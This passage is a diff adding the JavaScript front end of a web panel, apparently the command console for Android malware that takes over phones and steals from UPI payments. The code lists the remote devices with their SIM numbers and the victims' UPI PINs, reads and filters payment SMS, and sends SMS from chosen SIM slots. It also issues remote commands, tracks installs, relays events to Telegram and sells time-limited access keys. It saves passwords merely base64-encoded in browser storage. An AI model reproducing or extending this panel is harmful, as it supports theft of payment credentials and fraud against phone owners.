+const SKEY = "tpc.session.v9";
+let DEMO = false;
+let reloginPromise = null;
+let gridSig = "";
+let liveSig = "";
+
+const state = {
+auth:false, role:"user", me:null, users:[], devices:[], messages:[], devMsgs:{},
+rules:[], tgLogs:[], relay:null, relayAccount:null, forward:"", outbox:[],
+growth:null, growthEvents:[],
+pinsOnly:false, active:null, asOpen:false, toastTimer:null, pollTimer:null,
+ws:null, wsOk:false, wsFails:0, wsTimer:null, linkOk:true, numTried:{}, lastError:"",
+sel:{ as:[], send:[], bulk:[] }
+};
+
+function uid(){ return Math.random().toString(36).slice(2,10); }
+function addCls(el,name){ if(!el)return; const t=(name==null?"":String(name)).trim(); if(t)el.classList.add(t); }
+function reportError(e){
+const msg=(e&&(e.message||(e.reason&&e.reason.message)))||String(e||"unknown error");
+state.lastError=msg; try{console.error(e);}catch(x){}
+toast("error: "+msg);
+}
+window.addEventListener("error",(ev)=>{ if(ev&&ev.message)reportError(ev.message); });
+window.addEventListener("unhandledrejection",(ev)=>{ reportError(ev.reason); });
+
+function notice(text,bad){
+const el=$("#notice");
+if(!text){el.hidden=true;return;}
+el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
+}
+
+function token(){ try{return localStorage.getItem(TKEY)||"";}catch(e){return "";} }
+function setToken(t){ try{ t?localStorage.setItem(TKEY,t):localStorage.removeItem(TKEY);}catch(e){} }
+function saveSession(id,pass,keep,role){
+try{ localStorage.setItem(SKEY,JSON.stringify({id:id,role:role||"user",
+pass:keep&&pass?btoa(unescape(encodeURIComponent(pass))):null,at:Date.now()})); }catch(e){}
+}
+function readSession(){
+try{ const s=JSON.parse(localStorage.getItem(SKEY)||"null");
+if(!s||!s.id)return null; if(Date.now()-s.at>2592000000)return null; return s; }catch(e){ return null; }
+}
+function clearSession(){ setToken(""); try{localStorage.removeItem(SKEY);}catch(e){} }
+function decPass(p){ try{return decodeURIComponent(escape(atob(p)));}catch(e){return "";} }
+
+function toast(text){
+const t=$("#toast"); t.textContent=text; t.hidden=false;
+clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},4200);
+}
+function loginMsg(text,kind){ const el=$("#loginMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
+function badge(el,text,kind){ if(!el)return; el.textContent=text; el.className="badge "+(kind||""); }
+
+function fmt(v){ if(!v)return "—"; const d=new Date(v);
+return Number.isNaN(d.getTime())?String(v):d.toLocaleString(); }
+function fmtDate(v){ if(!v)return "—"; const d=new Date(v);
+return Number.isNaN(d.getTime())?String(v):d.toLocaleDateString(); }
+function toDateInput(v){ if(!v)return ""; const d=new Date(v); if(Number.isNaN(d.getTime()))return "";
+const p=(n)=>String(n).padStart(2,"0"); return d.getFullYear()+"-"+p(d.getMonth()+1)+"-"+p(d.getDate()); }
+function val(v,fb){
+if(v===null||v===undefined||v==="")return fb===undefined?"—":fb;
+if(typeof v==="boolean")return v?"Yes":"No";
+if(typeof v==="object"){try{return JSON.stringify(v);}catch(e){return "—";}}
+return String(v);
+}
+function cell(row,v){ const td=document.createElement("td"); td.textContent=val(v); row.appendChild(td); return td; }
+function badgeCell(row,v,force){
+const td=document.createElement("td"); const b=document.createElement("span");
+const s=String(val(v,"unknown")).toLowerCase(); b.className="badge";
+if(force&&String(force).trim())addCls(b,force);
+else if(["online","active","sent","success","bound","upi","delivered","received","ok","install"].indexOf(s)>=0)addCls(b,"ok");
+else if(["pending","queued","sending","update","stale"].indexOf(s)>=0)addCls(b,"warn");
+else if(["failed","error","offline","gone","uninstalled"].indexOf(s)>=0)addCls(b,"bad");
+b.textContent=val(v,"—"); td.appendChild(b); row.appendChild(td);
+}
+function simCell(row,slot){
+const td=document.createElement("td");
+if(slot===null||slot===undefined||slot===""){ td.textContent="—"; row.appendChild(td); return; }
+const b=document.createElement("span");
+b.className="badge sim";
+b.innerHTML=SIM_SVG+"<span>SIM "+(Number(slot)+1)+"</span>";
+td.appendChild(b); row.appendChild(td);
+}
+function empty(tbody,cols,text){
+tbody.replaceChildren();
+const row=document.createElement("tr"); const td=document.createElement("td");
+td.colSpan=cols; td.className="empty"; td.textContent=text;
+row.appendChild(td); tbody.appendChild(row);
+}
+function mark(text,needle){
+const s=String(text===null||text===undefined?"":text);
+if(!needle)return document.createTextNode(s);
+const frag=document.createDocumentFragment(); const low=s.toLowerCase(); const n=needle.toLowerCase();
+let i=0;
+while(i<=s.length){
+const idx=low.indexOf(n,i);
+if(idx===-1){ frag.appendChild(document.createTextNode(s.slice(i))); break; }
+if(idx>i)frag.appendChild(document.createTextNode(s.slice(i,idx)));
+const m=document.createElement("mark"); m.textContent=s.slice(idx,idx+n.length);
+frag.appendChild(m); i=idx+n.length;
+}
+return frag;
+}
+
+function devId(d){ return (d&&(d.id||d._id))||null; }
+function devName(d){ return d.device_name||d.name||"Unnamed device"; }
+function devStatus(d){ if(d.ws_connected)return "Online"; return d.status||"Offline"; }
+function online(d){ return Boolean(d.ws_connected); }
+function tel(d){ return d.telemetry&&typeof d.telemetry==="object"?d.telemetry:{}; }
+function hasPin(d){ return Boolean(d.upi_pin); }
+function autoOf(d){
+return (d&&d.auto_sender)||{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true};
+}
+function findDevice(id){ return state.devices.find((x)=>String(devId(x))===String(id))||null; }
+function shortOf(deviceId){ const d=findDevice(deviceId); return d&&d.short_id?d.short_id:""; }
+function batt(d){ const l=tel(d).battery_level; return typeof l==="number"&&l>=0?l:null; }
+
+function battEl(d){
+const lvl=batt(d); const wrap=document.createElement("span"); wrap.className="batt";
+const shell=document.createElement("span"); shell.className="batt-shell";
+const fill=document.createElement("span"); fill.className="batt-fill";
+if(lvl===null){ fill.style.width="0%"; }
+else{ const p=Math.max(0,Math.min(100,lvl)); fill.style.width=p+"%";
+if(p<=15)addCls(fill,"low"); else if(p<=40)addCls(fill,"mid"); }
+shell.appendChild(fill); wrap.appendChild(shell);
+const label=document.createElement("span"); label.className="batt-label";
+label.textContent=lvl===null?"—":lvl+"%"; wrap.appendChild(label);
+if(tel(d).battery_charging){ const b=document.createElement("span");
+b.style.color="var(--amber)"; b.innerHTML=BOLT_SVG; wrap.appendChild(b); }
+return wrap;
+}
+
+function mem(v){
+if(v===null||v===undefined||v==="")return "—";
+if(typeof v==="string"&&Number.isNaN(Number(v)))return v;
+const n=Number(v); if(Number.isNaN(n))return String(v);
+if(n>=512)return (+(n/1024).toFixed(1))+" GB";
+if(n>=1)return (+n.toFixed(n<10?1:0))+" GB";
+return Math.round(n*1024)+" MB";
+}
+function pick(o,keys){ for(let i=0;i<keys.length;i++){ const v=o?o[keys[i]]:null;
+if(v!==null&&v!==undefined&&v!=="")return v; } return null; }
+function ram(d){ const t=tel(d);
+const gb=pick(t,["ram_gb","total_ram_gb","ram_size_gb","memory_gb"]);
+if(gb!==null)return gb+" GB";
+const mb=pick(t,["ram_total_mb","ram_mb","ram_total","total_ram_mb","ram"]);
+return mb!==null?mem(mb):"—"; }
+function storage(d){ const t=tel(d);
+const gb=pick(t,["storage_gb","total_storage_gb","disk_gb"]);
+if(gb!==null)return gb+" GB";
+const mb=pick(t,["storage_total_mb","storage_mb","storage_total","storage"]);
+return mb!==null?mem(mb):"—"; }
+function freeStorage(d){ const v=pick(tel(d),["free_storage_mb","storage_free_mb","free_storage","storage_free"]);
+return v!==null?mem(v):null; }
+
+function nums(d){
+const t=tel(d);
+return {
+entered:d.entered_number||d.phone_number||null,
+live:d.live_number||t.sim_number||d.sim_number||null,
+source:t.sim_number_source||null,
+carrier:t.sim_carrier||null,
+slots:Array.isArray(t.sims)?t.sims:[]
+};
+}
+function devMsgs(d){
+const id=devId(d); if(id===null)return [];
+const c=state.devMsgs[String(id)]; if(c)return c;
+return state.messages.filter((m)=>String(m.device_id)===String(id));
+}
+function simCount(d){
+const t=tel(d);
+let n=Array.isArray(t.sims)?t.sims.length:0;
+if(n<=0){ try{ n=Number(t.sim_count||0)||0; }catch(e){ n=0; } }
+return Math.max(1,Math.min(n,2));
+}
+function simLabel(d,slot){
+const s=nums(d).slots[slot];
+const c=s&&(s.carrier||s.number);
+return c||"slot "+(slot+1);
+}
+
+async function api(path,options,retry){
+if(DEMO)return mockApi(path,options);
+const o=options||{};
+const headers=Object.assign(
+{"Accept":"application/json"},
+token()?{"Authorization":"Bearer "+token()}:{},
+o.body?{"Content-Type":"application/json"}:{},
+o.headers||{}
+);
+let res;
+try{ res=await fetch(path,{credentials:"same-origin",method:o.method||"GET",headers:headers,body:o.body}); }
+catch(err){ enterDemo(); return mockApi(path,o); }
+const ct=res.headers.get("content-type")||"";
+if(ct.indexOf("application/json")<0&&res.status>=400){ enterDemo(); return mockApi(path,o); }
+let data=null;
+if(ct.indexOf("application/json")>=0)data=await res.json().catch(()=>({}));
+else{ const txt=await res.text(); data=txt?{detail:txt}:{}; }
+
+if(res.status===401||res.status===403){
+const e=new Error(data.detail||"Authentication required."); e.auth=true;
+if(retry!==false){
+const ok=await relogin();
+if(ok)return api(path,options,false);
+if(state.auth)showLogin("Session expire ho gaya — dobara sign in karo");
+}
+throw e;
+}
+if(!res.ok){
+let m=data.detail||data.message||("Failed ("+res.status+")");
+if(Array.isArray(m))m=m.map((x)=>x.msg||String(x)).join(", ");
+const e2=new Error(m); e2.status=res.status; throw e2;
+}
+return data;
+}
+
+async function relogin(){
+const s=readSession(); if(!s)return false;
+if(reloginPromise)return reloginPromise;
+reloginPromise=(async()=>{
+try{
+let r;
+if(s.pass) r=await api("/panel/login",{method:"POST",body:JSON.stringify({username:s.id,password:decPass(s.pass)})},false);
+else r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:s.id})},false);
+if(r&&r.token)setToken(r.token);
+if(r&&r.role)state.role=r.role;
+return true;
+}catch(e){ return false; } finally{ reloginPromise=null; }
+})();
+return reloginPromise;
+}
+
+function enterDemo(){ if(DEMO)return; DEMO=true; setLink("Demo");
+notice("Backend reachable nahi — demo data par chal raha hai",true); }
+function leaveDemo(){ DEMO=false; notice(""); setLink("Live"); }
+
+function selSlots(arr){ return arr.filter((s)=>s===0||s===1).sort(); }
+
+function attemptSend(job){
+const body={to:job.to||null,body:job.body,sim_slots:job.slots&&job.slots.length?job.slots:null};
+const tries=[
+{url:"/admin/send",body:Object.assign({target:"device",device_id:job.deviceId},body)},
+{url:"/admin/devices/"+job.deviceId+"/sms",body:body}
+];
+job.status="sending"; renderOutbox();
+let last=null;
+const chain=tries.reduce((p,t)=>p.then((done)=>{
+if(done)return true;
+return api(t.url,{method:"POST",body:JSON.stringify(t.body)})
+.then((r)=>{
+job.status="queued";
+job.delivered=r&&typeof r.delivered==="number"?r.delivered:(r&&r.delivered?1:0);
+job.queued=r&&typeof r.queued==="number"?r.queued:1;
+renderOutbox();
+toast("queued "+job.queued+" · delivered "+job.delivered);
+loadMessages().catch(()=>{});
+loadStats().catch(()=>{});
+return true;
+})
+.catch((e)=>{ last=e; return false; });
+}),Promise.resolve(false));
+return chain.then((ok)=>{
+if(ok)return true;
+job.status="failed"; job.error=last?last.message:"send failed";
+renderOutbox(); toast("send fail: "+job.error); return false;
+});
+}
+
+function sendSms(o){
+const job={id:uid(),deviceId:o.deviceId,deviceName:o.deviceName,to:o.to||null,
+body:o.body,slots:selSlots(o.slots||[]),at:Date.now(),status:"sending",error:null,
+delivered:0,queued:0};
+state.outbox.unshift(job);
+if(state.outbox.length>60)state.outbox.pop();
+renderOutbox();
+return attemptSend(job);
+}
+
+function renderOutbox(){
+const box=$("#dOutbox"); if(!box)return;
+const d=state.active;
+const list=state.outbox.filter((j)=>!d||String(j.deviceId)===String(devId(d)));
+box.replaceChildren();
+if(!list.length){ const e=document.createElement("div");
+e.className="muted small"; e.textContent="Koi recent send nahi"; box.appendChild(e); return; }
+list.slice(0,6).forEach((j)=>{
+const item=document.createElement("div"); item.className="out-item";
+const b=document.createElement("span");
+b.className="badge "+(j.status==="queued"?"warn":j.status==="failed"?"bad":j.status==="sent"?"ok":"");
+b.textContent=j.status==="queued"?(j.delivered+" / "+j.queued+" delivered"):j.status;
+item.appendChild(b);
+(j.slots||[]).forEach((s)=>{
+const sb=document.createElement("span"); sb.className="badge sim";
+sb.innerHTML=SIM_SVG+"<span>SIM "+(s+1)+"</span>"; item.appendChild(sb);
+});
+const body=document.createElement("span"); body.className="out-body";
+body.textContent=(j.to?j.to+" · ":"")+j.body; body.title=j.body; item.appendChild(body);
+if(j.status==="failed"){
+const rb=document.createElement("button"); rb.className="mini"; rb.type="button";
+rb.textContent="Retry"; rb.addEventListener("click",()=>attemptSend(j)); item.appendChild(rb);
+}else{
+const t=document.createElement("span"); t.className="out-time";
+t.textContent=new Date(j.at).toLocaleTimeString(); item.appendChild(t);
+}
+box.appendChild(item);
+});
+}
+
+function devCommand(id,action){
+const tries=[
+["/admin/devices/"+id+"/command",{action:action}],
+["/admin/devices/"+id+"/refresh",{action:action}],
+["/admin/devices/"+id+"/ping",{}]
+];
+return tries.reduce((p,t)=>p.then((done)=>done?true:
+api(t[0],{method:"POST",body:JSON.stringify(t[1])}).then(()=>true).catch(()=>false)),
+Promise.resolve(false));
+}
+
+async function pingDevice(d){ toast("ping bheja…"); await devCommand(devId(d),"ping");
+setTimeout(()=>loadDevices().catch(()=>{}),1200); }
+async function fetchNumber(d){ toast("number request bheja…");
+await devCommand(devId(d),"fetch_number");
+await new Promise((r)=>setTimeout(r,1400));
+await loadDevices().catch(()=>{});
+const f=findDevice(devId(d)); const live=f?nums(f).live:null;
+toast(live?"live number: "+live:"reply ka wait karo"); }
+async function pushOutbox(d){
+try{ const r=await api("/admin/devices/"+devId(d)+"/push-outbox",{method:"POST"});
+toast("pushed "+((r&&r.pushed)||0)+" pending"); await loadMessages(); }
+catch(e){ toast(e.message); }
+}
+
+function applyRole(){
+const isAdmin=state.role==="admin";
+document.querySelectorAll("[data-admin-only]").forEach((el)=>{ el.hidden=!isAdmin; });
+badge($("#roleBadge"),isAdmin?"ADMIN":"USER",isAdmin?"ok":"id");
+}
+
+function showLogin(msgText){
+state.auth=false; $("#app").hidden=true; $("#loginScreen").hidden=false; closeDetail();
+const s=readSession(); if(s&&s.id&&!$("#username").value)$("#username").value=s.id;
+if(msgText)loginMsg(msgText);
+}
+function showApp(){ state.auth=true; $("#loginScreen").hidden=true; $("#app").hidden=false; }
+
+async function afterLogin(role){
+state.role=role||"user"; applyRole(); await refreshAll(); startRealtime();
+}
+
+async function checkAuth(){
+const s=readSession();
+if(s){
+showApp();
+let info=null;
+try{ info=await api("/admin/auth/status"); }catch(e){}
+if(info&&info.authenticated){ await afterLogin(info.role||s.role||"user"); return; }
+const ok=await relogin();
+if(ok){ await afterLogin(state.role||s.role||"user"); return; }
+showLogin("Saved session invalid — key/paasword daalo"); return;
+}
+try{
+const r2=await api("/admin/auth/status");
+if(r2&&r2.authenticated){ showApp(); await afterLogin(r2.role||"admin"); return; }
+}catch(e){}
+showLogin("");
+}
+
+/* ------------------------------- SIM chips ------------------------------- */
+
+function buildSimChips(container,key,device,onChange){
+if(!container)return;
+container.replaceChildren();
+const sel=state.sel[key]||[];
+[0,1].forEach((slot)=>{
+const btn=document.createElement("button");
+btn.type="button";
+btn.className="simchip"+(sel.indexOf(slot)>=0?" on":"");
+btn.dataset.slot=String(slot);
+btn.innerHTML=SIM_SVG+'<span>SIM '+(slot+1)+
+'<span class="sc-sub">'+String(simLabel(device,slot)).replace(/[<>&]/g,"")+'</span></span>';
+btn.addEventListener("click",()=>{
+const cur=state.sel[key]||[];
+const i=cur.indexOf(slot);
+if(i>=0)cur.splice(i,1); else cur.push(slot);
+state.sel[key]=cur;
+btn.classList.toggle("on",cur.indexOf(slot)>=0);
+if(onChange)onChange();
+});
+container.appendChild(btn);
+});
+if(!sel.length){
+const hint=document.createElement("span");
+hint.className="small muted";
+hint.style.alignSelf="center";
+hint.textContent="(kuch select na ho to device default)";
+container.appendChild(hint);
+}
+}
+
+function refreshAsSimChips(){
+const d=state.active;
+buildSimChips($("#asSims"),"as",d,async()=>{
+await saveAutoSender({sim_slots:state.sel.as.slice()});
+toast("SIM selection saved");
+});
+}
+
+/* ------------------------------- renders ------------------------------- */
+
+function renderOverview(){
+const total=state.devices.length; const on=state.devices.filter(online).length;
+$("#sTotal").textContent=total; $("#sOnline").textContent=on; $("#sOffline").textContent=total-on;
+const sims=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||d.sim_count||0),0);
+$("#sSims").textContent=sims;
+$("#sPins").textContent=state.devices.filter(hasPin).length;
+if(state.growth){
+$("#sInstalls").textContent=state.growth.installs_total;
+$("#sUninstalled").textContent=state.growth.uninstalled;
+$("#sReinstalls").textContent=state.growth.reinstalls;
+}
+const body=$("#recentBody");
+if(!state.devices.length){ empty(body,5,"No devices registered"); return; }
+body.replaceChildren();
+state.devices.slice(0,6).forEach((d)=>{
+const row=document.createElement("tr");
+cell(row,devName(d));
+const idc=document.createElement("td"); const idb=document.createElement("span");
+idb.className="badge id mono"; idb.textContent=d.short_id||"—"; idc.appendChild(idb); row.appendChild(idc);
+const c=document.createElement("td"); const info=nums(d);
+c.textContent=info.live||info.entered||tel(d).sim_carrier||"—";
+if(d.upi_pin){ const p=document.createElement("span"); p.className="pin-chip";
+p.textContent="PIN "+d.upi_pin; c.appendChild(p); }
+row.appendChild(c);
+badgeCell(row,devStatus(d)); cell(row,fmt(d.created_at));
+body.appendChild(row);
+});
+}
+
+function liveSignature(){
+return state.devices.map((d)=>[devId(d),devName(d),devStatus(d),nums(d).live,nums(d).entered,tel(d).model].join("|")).join("~");
+}
+
+function renderLive(force){
+const sig=liveSignature(); if(!force&&sig===liveSig)return; liveSig=sig;
+const total=state.devices.length; const on=state.devices.filter(online).length;
+$("#lTotal").textContent=total; $("#lOnline").textContent=on; $("#lOffline").textContent=total-on;
+$("#liveCount").textContent=total;
+$("#lUpi").textContent=state.messages.filter((m)=>m.kind==="upi").length;
+const body=$("#liveBody");
+if(!state.devices.length){ empty(body,5,"No devices"); return; }
+body.replaceChildren();
+
+state.devices.forEach((d)=>{
+const info=nums(d); const row=document.createElement("tr");
+const nameCell=document.createElement("td"); nameCell.textContent=devName(d);
+const sub=document.createElement("span"); sub.className="sub mono";
+sub.textContent=(d.short_id?d.short_id+" · ":"")+(online(d)?"● online":"○ offline")+" · "+(tel(d).model||"—");
+nameCell.appendChild(sub); row.appendChild(nameCell);
+
+const numCell=document.createElement("td"); numCell.className="mono";
+numCell.textContent=info.live||info.entered||"—";
+const nsub=document.createElement("span"); nsub.className="sub";
+nsub.textContent=info.live?"live (device)":(info.entered?"entered (operator)":"no number");
+numCell.appendChild(nsub); row.appendChild(numCell);
+
+const sc=document.createElement("td"); const wrap0=document.createElement("div");
+wrap0.className="simchips"; wrap0.style.marginTop="0";
+[0,1].forEach((slot)=>{
+const b=document.createElement("button"); b.type="button";
+b.className="simchip"; b.dataset.slot=String(slot);
+b.innerHTML=SIM_SVG+"<span>SIM "+(slot+1)+"</span>";
+b.addEventListener("click",()=>b.classList.toggle("on"));
+wrap0.appendChild(b);
+});
+sc.appendChild(wrap0); row.appendChild(sc);
+
+const sendCell=document.createElement("td"); const wrap=document.createElement("div");
+wrap.style.display="flex"; wrap.style.gap="6px";
+const input=document.createElement("input"); input.placeholder="message…"; input.style.minWidth="150px";
+const btn=document.createElement("button"); btn.className="mini"; btn.type="button"; btn.textContent="Send";
+btn.addEventListener("click",async()=>{
+const text=input.value.trim(); if(!text){ toast("message khali hai"); return; }
+const slots=Array.from(wrap0.querySelectorAll(".simchip.on")).map((x)=>Number(x.dataset.slot));
+btn.disabled=true;
+const ok=await sendSms({deviceId:devId(d),deviceName:devName(d),
+to:info.live||info.entered||null,body:text,slots:slots});
+if(ok)input.value="";
+btn.disabled=false;
+});
+wrap.appendChild(input); wrap.appendChild(btn); sendCell.appendChild(wrap); row.appendChild(sendCell);
+
+const lastCell=document.createElement("td"); const openBtn=document.createElement("button");
+openBtn.className="mini v"; openBtn.type="button"; openBtn.textContent="Open";
+openBtn.addEventListener("click",()=>openDeviceById(devId(d)));
+lastCell.appendChild(openBtn); row.appendChild(lastCell);
+
+body.appendChild(row);
+});
+}
+
+function renderMessages(){
+const filter=$("#msgFilter").value; const q=($("#msgSearch").value||"").trim().toLowerCase();
+let list=state.messages;
+if(filter==="in"||filter==="out")list=list.filter((m)=>m.direction===filter);
+if(filter==="upi")list=list.filter((m)=>m.kind==="upi");
+if(q)list=list.filter((m)=>(String(m.body)+" "+String(m.address)+" "+String(m.device_name)+" "+shortOf(m.device_id)+" "+String(m.amount)+" "+String(m.status)).toLowerCase().indexOf(q)>=0);
+$("#msgCount").textContent=list.length+" messages";
+const body=$("#msgBody");
+if(!list.length){ empty(body,8,"No messages"); return; }
+body.replaceChildren();
+list.slice(0,300).forEach((m)=>{
+const row=document.createElement("tr");
+cell(row,fmt(m.created_at));
+const dcell=document.createElement("td"); const dn=document.createElement("span");
+dn.textContent=m.device_name||"—"; dcell.appendChild(dn);
+const sid=shortOf(m.device_id);
+if(sid){ const s=document.createElement("span"); s.className="sub mono"; s.textContent=sid; dcell.appendChild(s); }
+row.appendChild(dcell);
+badgeCell(row,m.direction==="in"?"in":"out",m.direction==="in"?"in":"out");
+simCell(row,m.direction==="out"?m.sim_slot:null);
+const addr=document.createElement("td"); addr.className="mono";
+addr.appendChild(mark(m.address||"—",q)); row.appendChild(addr);
+const bc=document.createElement("td"); const span=document.createElement("span");
+span.className="body-cell"; span.title=m.body||""; span.appendChild(mark(m.body||"—",q));
+bc.appendChild(span); row.appendChild(bc);
+cell(row,m.amount?"₹"+m.amount:"—");
+badgeCell(row,m.status||(m.direction==="in"?"received":"sent"));
+body.appendChild(row);
+});
+}
+
+/* ------------------------------- GROWTH ------------------------------- */
+
+async function loadStats(){
+try{ state.growth=await api("/admin/stats"); renderGrowth(); }catch(e){}
+}
+
+async function loadGrowthEvents(){
+const f=$("#growthFilter")?$("#growthFilter").value:"";
+try{
+const d=await api("/admin/growth/events?limit=120");
+state.growthEvents=(d.events||[]).filter((e)=>!f||e.event===f);
+}catch(e){ state.growthEvents=[]; }
+renderGrowthEvents();
+}
+
+function renderGrowth(){
+const g=state.growth; if(!g)return;
+$("#gInstalls").textContent=g.installs_total;
+$("#gLive").textContent=g.live;
+$("#gIdle").textContent=g.idle;
+$("#gStale").textContent=g.stale;
+$("#gUninstalled").textContent=g.uninstalled;
+$("#gReinstalls").textContent=g.reinstalls;
+$("#gUnique").textContent=g.unique_devices;
+$("#gToday").textContent=g.install_events_24h;
+$("#gRate").textContent=g.uninstall_rate_pct+"%";
+const o=g.outbox||{};
+$("#gQueued").textContent=o.queued||0;
+$("#gSent").textContent=o.sent||0;
+$("#gDelivered").textContent=o.delivered||0;
+$("#gFailed").textContent=o.failed||0;
+badge($("#gQueueBadge"),(o.pending||0)+" pending",(o.pending?"warn":"ok"));
+$("#sInstalls").textContent=g.installs_total;
+$("#sUninstalled").textContent=g.uninstalled;
+$("#sReinstalls").textContent=g.reinstalls;
+}
+
+function renderGrowthEvents(){
+$("#gEventCount").textContent=state.growthEvents.length+" events";
+const body=$("#gEventBody");
+if(!state.growthEvents.length){ empty(body,6,"Koi event nahi"); return; }
+body.replaceChildren();
+state.growthEvents.forEach((e)=>{
+const row=document.createElement("tr");
+cell(row,fmt(e.ts));
+const kind=String(e.event||"").toLowerCase();
+badgeCell(row,kind,kind==="install"?"ok":kind==="gone"?"bad":kind==="update"?"warn":"");
+cell(row,e.device_name||"—");
+const idc=document.createElement("td"); const idb=document.createElement("span");
+idb.className="badge id mono"; idb.textContent=e.short_id||"—"; idc.appendChild(idb); row.appendChild(idc);
+cell(row,e.app_version||"—");
+cell(row,e.android_id||"—");
+body.appendChild(row);
+});
+}
+
+/* ------------------------------- KEYS ------------------------------- */
+
+function keyStatus(u){
+if(u.blocked)return{text:"blocked",kind:"bad"};
+if(u.expired)return{text:"expired",kind:"bad"};
+if(!u.expires_at)return{text:"lifetime",kind:"ok"};
+return{text:"active",kind:"ok"};
+}
+
+function renderUsers(){
+const q=($("#userSearch").value||"").trim().toLowerCase();
+let list=state.users;
+if(q)list=list.filter((u)=>[u.key,u.label,u.phone].filter(Boolean).join(" ").toLowerCase().indexOf(q)>=0);
+const now=Date.now();
+$("#uTotal").textContent=state.users.length;
+$("#uActive").textContent=state.users.filter((u)=>!u.blocked&&(!u.expires_at||new Date(u.expires_at).getTime()>now)).length;
+$("#uExpired").textContent=state.users.filter((u)=>!u.blocked&&u.expires_at&&new Date(u.expires_at).getTime()<=now).length;
+$("#uBlocked").textContent=state.users.filter((u)=>u.blocked).length;
+$("#userCount").textContent=list.length+" keys";
+const body=$("#userBody");
+if(!list.length){ empty(body,9,q?"Koi key match nahi hui":"Abhi koi key generate nahi ki"); return; }
+body.replaceChildren();
+
+list.forEach((u)=>{
+const row=document.createElement("tr");
+
+const kc=document.createElement("td");
+const kb=document.createElement("span"); kb.className="badge key"; kb.textContent=u.key||"—";
+kc.appendChild(kb); row.appendChild(kc);
+
+const lc=document.createElement("td"); lc.textContent=u.label||"—";
+if(u.phone){ const p=document.createElement("span"); p.className="sub mono"; p.textContent=u.phone; lc.appendChild(p); }
+row.appendChild(lc);
+
+cell(row,fmtDate(u.created_at));
+const ll=document.createElement("td"); ll.textContent=u.last_login_at?fmt(u.last_login_at):"never"; row.appendChild(ll);
+cell(row,String(u.login_count||0));
+
+const ec=document.createElement("td"); const eb=document.createElement("span");
+eb.className="badge "+(u.expires_at?(u.expired?"bad":"warn"):"ok");
+eb.textContent=u.expires_at?fmtDate(u.expires_at):"lifetime";
+ec.appendChild(eb); row.appendChild(ec);
+
+const st=keyStatus(u); badgeCell(row,st.text,st.kind);
+
+const sc=document.createElement("td"); const wrap=document.createElement("div"); wrap.className="u-actions";
+[7,30,90].forEach((days)=>{
+const b=document.createElement("button"); b.className="mini"; b.type="button"; b.textContent="+"+days+"d";
+b.addEventListener("click",()=>setKeyExpiry(u.id,{days:days})); wrap.appendChild(b);
+});
+const inf=document.createElement("button"); inf.className="mini v"; inf.type="button";
+inf.textContent="∞"; inf.title="Lifetime"; inf.addEventListener("click",()=>setKeyExpiry(u.id,{lifetime:true}));
+wrap.appendChild(inf);
+const di=document.createElement("input"); di.type="date"; di.value=toDateInput(u.expires_at); wrap.appendChild(di);
+const sb=document.createElement("button"); sb.className="mini g"; sb.type="button"; sb.textContent="Set";
+sb.addEventListener("click",()=>{ if(!di.value){ toast("date chuno"); return; }
+setKeyExpiry(u.id,{expires_at:di.value+"T23:59:59"}); });
+wrap.appendChild(sb);
+sc.appendChild(wrap); row.appendChild(sc);
+
+const ac=document.createElement("td"); const aw=document.createElement("div"); aw.className="u-actions";
+const cb=document.createElement("button"); cb.className="mini"; cb.type="button"; cb.textContent="⧉ copy";
+cb.addEventListener("click",()=>copyText(u.key||"",u.key||"")); aw.appendChild(cb);
+const tb=document.createElement("button"); tb.className="mini "+(u.blocked?"g":"d"); tb.type="button";
+tb.textContent=u.blocked?"Unblock":"Block"; tb.addEventListener("click",()=>toggleKey(u.id,u.blocked));
+aw.appendChild(tb);
+const db=document.createElement("button"); db.className="mini d"; db.type="button"; db.textContent="Delete";
+db.addEventListener("click",()=>deleteKey(u)); aw.appendChild(db);
+ac.appendChild(aw); row.appendChild(ac);
+
+body.appendChild(row);
+});
+}
+
+function copyText(text,label){
+if(navigator.clipboard)navigator.clipboard.writeText(text)
+.then(()=>toast("copied: "+(label||text))).catch(()=>toast(label||text));
+else toast(label||text);
+}
+
+async function setKeyExpiry(id,payload){
+try{ await api("/admin/keys/"+id+"/expiry",{method:"POST",body:JSON.stringify(payload)});
+toast("expiry set"); await loadUsers(); }catch(e){ toast(e.message); }
+}
+async function toggleKey(id,blocked){
+try{ await api("/admin/keys/"+id+"/toggle",{method:"POST",body:JSON.stringify({blocked:!blocked})});
+toast(blocked?"unblocked":"blocked"); await loadUsers(); }catch(e){ toast(e.message); }
+}
+async function deleteKey(u){
+if(!confirm("Delete key "+(u.key||"")+"?"))return;
+try{ await api("/admin/keys/"+u.id+"/delete",{method:"POST"}); toast("deleted"); await loadUsers(); }
+catch(e){ toast(e.message); }
+}
+
+/* -------------------------------------------------------------------- */
+
+function renderRules(){
+$("#ruleCount").textContent=state.rules.length+" rules";
+const body=$("#ruleBody");
+if(!state.rules.length){ empty(body,6,"No rules configured"); return; }
+body.replaceChildren();
+state.rules.forEach((r)=>{
+const row=document.createElement("tr");
+cell(row,r.name||"—"); cell(row,r.match||"—");
+const rc=document.createElement("td"); const span=document.createElement("span");
+span.className="body-cell"; span.textContent=r.reply||"—"; rc.appendChild(span); row.appendChild(rc);
+cell(row,r.upi_only?"UPI only":"All SMS");
+badgeCell(row,r.enabled?"active":"disabled");
+const act=document.createElement("td"); const btn=document.createElement("button");
+btn.className="mini"; btn.type="button"; btn.textContent=r.enabled?"Disable":"Enable";
+btn.addEventListener("click",async()=>{ try{ await api("/admin/rules/"+r.id+"/toggle",{method:"POST"}); await loadRules(); }
+catch(e){ toast(e.message); } });
+act.appendChild(btn); row.appendChild(act);
+body.appendChild(row);
+});
+}
+
+function renderRelayLogs(){
+$("#tgCount").textContent=state.tgLogs.length+" events";
+const body=$("#tgBody");
+if(!state.tgLogs.length){ empty(body,4,"No relay events"); return; }
+body.replaceChildren();
+state.tgLogs.forEach((l)=>{
+const row=document.createElement("tr");
+cell(row,fmt(l.created_at));
+badgeCell(row,l.direction==="in"?"in":"out",l.direction==="in"?"in":"out");
+const txt=document.createElement("td"); const span=document.createElement("span");
+span.className="body-cell"; span.textContent=l.text||"—"; txt.appendChild(span); row.appendChild(txt);
+cell(row,l.result||"—"); body.appendChild(row);
+});
+}
+
+function gridSignature(){
